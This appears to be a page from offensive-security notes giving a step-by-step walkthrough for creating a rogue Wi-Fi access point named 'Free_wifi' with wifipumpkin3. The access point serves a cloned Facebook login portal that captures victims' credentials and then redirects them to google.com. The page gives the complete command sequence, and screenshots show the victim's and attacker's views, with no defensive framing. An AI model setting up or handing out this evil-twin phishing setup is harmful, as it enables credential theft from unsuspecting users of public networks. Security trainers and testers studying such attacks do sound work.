# Using captive portal attack

## Creating a fake access point with an extra captive portal

What can we do using a captive portal?

* Basically, do phishing by cloning official login portals and trick or clients to give us credentials or sensitive information.

### Configuration

<figure><img src="../../../../.gitbook/assets/wifipumpkin_firstconfig.png" alt=""><figcaption></figcaption></figure>

* First, we define the SSID (Name of the access point), interface and ignoring pydns\_server.

<figure><img src="../../../../.gitbook/assets/wifipumpkin3_installing_templates.png" alt=""><figcaption></figcaption></figure>

* In this case I'll be using a facebook captive portal to trick the users, so to install it just do the following.

```bash
use misc.extra_captiveflask
download
```

<figure><img src="../../../../.gitbook/assets/wifipumpkin3_installing_templates_facebook.png" alt=""><figcaption></figcaption></figure>

* Now I'll select the facebook template.

```bash
install facebook # simple as that
back
```

<figure><img src="../../../../.gitbook/assets/wifipumpkin_proxies.png" alt=""><figcaption></figcaption></figure>

* Now we need to choose what proxy we want to use.
* In this case we will use the captiveflask proxy.
* Just type _**`set proxy captiveflask`**_

<figure><img src="../../../../.gitbook/assets/force_redirect_to_url.png" alt=""><figcaption></figcaption></figure>

* Here in the setting options, I'll type _**`set captiveflask.force_redirect_to_url https://google.com`**_
* This will redirect the user to **google.com** once he types the requested credentials.

<figure><img src="../../../../.gitbook/assets/setting_faccebook_true (2).png" alt=""><figcaption></figcaption></figure>

### Victims phone

<figure><img src="https://i0.wp.com/1.bp.blogspot.com/-md7HPxTAJ6o/YQG2TfOi2LI/AAAAAAAAx-M/wI6Or4Dz544kiwjMNq3EvyuCdww_02pHwCLcBGAsYHQ/s16000/47.png?w=640&#x26;ssl=1" alt=""><figcaption></figcaption></figure>

### Attackers overview

<figure><img src="https://i0.wp.com/1.bp.blogspot.com/-vO6ZPlu7Y_U/YQFsDystTQI/AAAAAAAAx7A/-72BJLcOmc0NEyEdS4sBDPbBujT05NX6wCLcBGAsYHQ/s16000/48.png?w=640&#x26;ssl=1" alt=""><figcaption></figcaption></figure>

### Commands used

```bash
set interface wlan0
set ssid Free_wifi
use misc.extra_captiveflask
download
install facebook # simple as that
back
set proxy captiveflask
set captiveflask.force_redirect_to_url https://google.com
set captiveflask.facebook true
start
```
